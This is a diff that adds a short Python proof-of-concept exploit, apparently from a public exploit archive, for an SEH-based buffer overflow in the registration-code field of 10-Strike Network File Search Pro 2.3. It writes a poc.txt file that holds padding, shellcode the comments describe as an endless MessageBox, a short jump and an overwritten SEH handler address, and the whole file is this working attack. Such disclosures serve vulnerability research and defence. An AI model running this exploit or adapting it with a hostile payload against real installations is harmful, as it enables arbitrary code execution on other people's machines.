@@ -1,0 +1,32 @@
+#!python
+#####################################################################################
+# Exploit title: 10-Strike Network File Search Pro 2.3 Registration code SEH exploit
+# Date: 2016-12-10
+# Vendor homepage: https://www.10-strike.com/network-file-search/help/pro.shtml
+# Download: https://www.10-strike.com/network-file-search/network-file-search-pro.exe
+# Tested on: Win7 SP1
+# Author: malwrforensics
+# Details: Help->Enter registration code... and paste the text from poc.txt
+#####################################################################################
+
+def write_poc(fname, buffer):
+	fhandle = open(fname , 'wb')
+	fhandle.write(buffer)
+	fhandle.close()
+
+fname="poc.txt"
+buf = '\x41' * 0xfe0
+
+#########################
+# Shellcode
+# MessageBox ad infinitum
+#########################
+shellcode = ("\x68\x24\x3F\x30\x41\x58\x35\x70\x41\x70"
+"\x41\x50\x59\x68\x41\x41\x41\x41\x58\x35"
+"\x41\x41\x41\x41\x50\x50\x50\x50\x51\xC3")
+
+junk = '\x41' * 0x5e
+jmp = '\xeb\x82\x41\x41'
+nseh = '\xec\x14\x40\x00'
+buffer = buf + shellcode + junk + jmp + nseh
+write_poc(fname, buffer)
